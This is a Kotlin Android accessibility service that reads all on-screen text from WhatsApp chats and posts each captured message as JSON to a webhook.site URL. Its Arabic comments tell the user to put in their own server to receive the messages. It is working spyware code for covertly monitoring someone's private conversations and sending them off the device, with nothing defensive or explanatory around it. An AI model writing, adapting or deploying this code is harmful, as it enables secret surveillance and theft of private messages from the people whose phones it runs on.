package com.project.monitor

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class WhatsAppAccessibilityService : AccessibilityService() {

    private val client = OkHttpClient()
    
    // استبدل هذا الرابط برابط السيرفر أو الـ Webhook الخاص بك لاستقبال الرسائل
    private val serverUrl = "https://webhook.site/6e8b6175-73da-4c98-b626-6ca9145ca453"

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.packageName == "com.whatsapp") {
            val rootNode: AccessibilityNodeInfo? = rootInActiveWindow
            if (rootNode != null) {
                extractChatContent(rootNode)
                rootNode.recycle()
            }
        }
    }

    private fun extractChatContent(node: AccessibilityNodeInfo) {
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (!child.text.isNullOrEmpty()) {
                val messageText = child.text.toString()
                Log.d("WhatsAppMonitor", "Captured: $messageText")
                
                // إرسال الرسالة عبر الإنترنت
                sendDataToServer(messageText)
            }
            extractChatContent(child)
            child.recycle()
        }
    }

    private fun sendDataToServer(message: String) {
        val jsonMediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
        val jsonBody = "{\"message\":\"$message\"}".toRequestBody(jsonMediaType)

        val request = Request.Builder()
            .url(serverUrl)
            .post(jsonBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("WhatsAppMonitor", "Failed to send message", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d("WhatsAppMonitor", "Message sent successfully")
                }
                response.close()
            }
        })
    }

    override fun onInterrupt() {}
}
